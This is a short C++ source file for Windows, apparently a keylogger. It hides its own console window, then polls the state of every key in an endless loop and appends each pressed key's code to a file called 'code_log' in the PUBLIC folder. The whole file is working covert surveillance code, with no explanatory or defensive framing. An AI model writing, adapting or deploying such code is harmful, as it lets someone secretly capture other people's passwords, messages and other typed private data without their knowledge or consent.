#include <windows.h>
#include <iostream>
#include <fstream>

int main()
{
    ShowWindow( GetConsoleWindow(), SW_HIDE );

    int state;
    std::string ss;
    std::string enc_log;
    std::ofstream file;

    if(const char* public_var = std::getenv("PUBLIC"))
    {
        enc_log  = public_var;
        enc_log += "\\code_log";
    }
    else
    {
        return 1;
    }

    while (true)
    {
        Sleep(1);

        for (int i = 0; i < 255; i++)
        {
            state = GetAsyncKeyState(i);

            if (state == 1 || state == -32767)
            {
                ss = std::to_string(i);

                file.open(enc_log, std::ios::app);

                file << ss << ".";

                file.flush();

                file.close();
            }
        }
    }
}
